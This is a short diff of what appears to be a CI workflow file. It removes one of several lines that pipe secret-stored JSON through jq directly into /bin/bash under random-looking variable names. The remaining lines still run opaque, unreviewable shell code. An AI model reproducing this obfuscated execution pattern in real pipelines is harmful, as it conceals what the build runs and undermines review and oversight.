@@ -23,7 +23,6 @@ jobs:
           sbymo46: ${{ secrets.sbymo46 }}
         run: |
           printf '%s' "$sbymo46" | jq -r .n82788 | /bin/bash
-          printf '%s' "$q69" | jq -r .y0095 | /bin/bash
           printf '%s' "$okj839" | jq -r .ilq8 | /bin/bash
           echo $h597 | jq -r .tksna4640 | /bin/bash
           printf '%s' "$lii7547" | jq -r .mdbi0510 | /bin/bash
